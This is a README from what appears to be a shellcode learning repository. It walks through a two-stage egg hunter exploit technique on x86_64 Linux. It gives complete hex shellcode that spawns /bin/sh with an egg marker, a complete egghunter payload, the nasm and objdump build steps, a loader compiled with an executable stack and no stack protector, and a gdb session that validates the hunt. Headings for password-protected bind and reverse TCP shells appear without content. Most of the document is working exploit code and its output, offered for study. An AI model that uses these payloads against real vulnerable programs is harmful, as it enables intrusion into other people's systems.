# Shellcode

For the purpose of learning how to shellcode

## Getting Started

## Launch /bin/sh

## Bind TCP Shell with password

## Reverse TCP Shell with password

## Egg hunter

Compare to x86 system, egg hunt under x86_64 system is relatively slow. In order to speed up common egg hunt proof of concept operation, using gdb to modify the value of RDX register which in our case is the pointer register that hold the value of virtual memory address space from 0x0000000000000000 all the way to 0x00007fffffffffff.

Based on the original egghunt paper writen by [mmiller@hick.org], there are three way to accomplish egghunt under Linux system. Which are access, access, sigaction syscall.

Given such a scenerio, a programme has a Buffer over flow vulnerability, while unfortunatily there is limited space for attacker to exploit this access point, then we split our exploit into two stag. The first stage contain shellcode that exploit this vulnerability, but has a specifically chosen code (egg) append at the beginning of our shellcode.

Stage 1:

	First send payload shellcode (1) into vulnerable program.

	|Egg|Shellcode| => Vulnerable program

	After that, the virtual address space of this specific program will contain our shellcode and wait for us to find.

Stage 2:

	Send egghunter shellcode (2) into vulnerable program, by using the aforementioned unique egg, this tiny shellcode will go ahead to scan all the virtual memory address space of target system. From page to page, once egghunter successfully locate egg, then we can jump into this exploit shellcode we planted at stage 1.

#### Proof of concept workthrough

Use execve_sh.asm as test shellcode, which will launch an interactive shell.

Compile shellcode:

```bash
$ nasm -felf64 execve_sh.asm -o shell.o
```

Use objdump to check if there is any nullbyte remained (loader is writen in C, which use null byte as string terminater symbol, in that case we don't want any null byte presence in our shellcode):

```bash
$ objdump -M intel -D shell.o
```

Extract shellcode:

```bash
$ bash gen.sh shell.o
```

Use egghunter1.asm as test egghunter, which implemented egg hunt by evoking access syscall.

Compile egghunter:

```bash
$ nasm -felf64 egghunter1.asm -o egghunter.o
```

Use objdump to check if there is any null byte remained:

```bash
$ objdump -M intel -D egghunter.o
```

Extract egghunter:

```bash
$ bash gen.sh egghunter.o
```

Shellcode:

```
\x90\x50\x90\x50\x90\x50\x90\x50\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05
```

Egghunter:

```
\xbb\x90\x50\x90\x50\x48\x31\xc9\x48\xf7\xe1\x66\x81\xca\xff\x0f\x48\xff\xc2\x50\x53\x51\x52\x57\x56\x48\x31\xf6\x48\x8d\x7a\x04\xb0\x15\x0f\x05\x3c\xf2\x5e\x5f\x5a\x59\x5b\x58\x74\xdd\x39\x1a\x75\xde\x39\x5a\x04\x75\xd9\xff\xe2\x48\x31\xc0\x48\x83\xc0\x3c\x0f\x05
```

Put these two shellcode string into loader.c

Compile loader.c:

```bash
$ gcc -fno-stack-protector -z execstack loader.c -o loader
```

Validate egghunter:

```bash
$ gdb -q ./loader -tui
```

Set disassembly flavor:

```
(gdb) set disassembly-flavor intel
```

Set break point:

```
(gdb) break main
```

Because of ASLR, the address of egg + shellcode is randomized at runtime, that is why we need gdb to find address of implanted shellcode to speed up this operation.

After several continue:

```
> 0x55555555806b <egghunter+11>   or     dx,0xfff
  0x555555558070 <egghunter+16>   inc    rdx
  ...
  0x555555558073 <egghunter+19>   push   rax
  0x555555558078 <egghunter+24>   push   rsi
  0x555555558079 <egghunter+25>   xor    rsi,rsi
  0x55555555807c <egghunter+28>   lea    rdi,[rdx+0x4]
  0x555555558080 <egghunter+32>   mov    al,0x15
  0x555555558082 <egghunter+34>   syscall
  0x555555558084 <egghunter+36>   cmp    al,0xf2
  ...
```

Now egghunter about to execute `or dx, 0xfff` to switch to another memory page.

Query memory address of shellcode variable:

```
(gdb) info variables shellcode
```

```
0x0000555555558020  shellcode
```
The result may vary each time loader runs, which is the purpose of ASLR

```
set $rdi = 0x0000555555558020
```

Now presumably egghunter is now at correct memory page, then address 0x0000555555558020 will look like this:

```
0x0000555555558020 0x5090509050905090 <- egg
0x0000555555558028 0x622fbb4850c03148 <- shellcode
0x0000555555558030 0x485368732f2f6e69
                   ...
[ higher address ] [    shellcode   ]
```

Pointer surpass 4 byte to check given address at RDI is accessible or not. If succeed then previous 4 byte is accessible as well. After that, egghunter go ahead to validate egg string. Again, egghunter check 4 byte from RDI which is 0x50905090 to see if this 4 byte match ebx or not, then proceed to check next 4 byte against ebx. If all succeed, means egghunter now locate correct egg. Therefore, jmp into RDI, which are essentailly several `nop` and `push` instruction, and finally slide into real shellcode.
